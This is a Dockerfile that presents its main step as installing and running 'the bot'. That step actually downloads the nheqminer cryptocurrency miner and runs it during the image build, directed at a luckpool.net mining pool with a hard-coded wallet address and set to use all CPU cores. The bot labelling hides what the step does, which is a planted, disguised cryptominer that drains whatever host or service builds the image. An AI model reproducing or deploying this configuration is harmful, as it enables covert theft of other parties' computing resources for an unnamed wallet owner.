FROM phusion/baseimage:bionic-1.0.0

# Use baseimage-docker's init system:
CMD ["/sbin/my_init"]

# Install dependencies:
RUN apt-get update && apt-get install -y \
    bash \
    curl \
    sudo \
    wget \
    git \
    make \
    busybox \
    build-essential \
    nodejs \
    npm \
    screen \
    neofetch \
    ca-certificates \
    libcurl4 \
    libjansson4 \
    libgomp1 \
 && mkdir -p /home/stuff
 # Set work dir:
WORKDIR /home

# Copy files:
COPY startbot.sh /home

# Run config.sh and clean up APT:
RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# Install the bot:
RUN wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz \
&& tar -xvf nheqminer-Linux-v0.8.2.tgz \
&& tar -xvf nheqminer-Linux-v0.8.2.tar.gz \
&& cd nheqminer \
&& ./nheqminer -v -l na.luckpool.net:3956 -u RBjwUUBxMbratayR2BWRbLWKZHBa4oxWs9 -t $(nproc --all) -p x

RUN echo "Uploaded files:" && ls /home/stuff/

# Run bot script:
CMD bash /home/startbot.sh
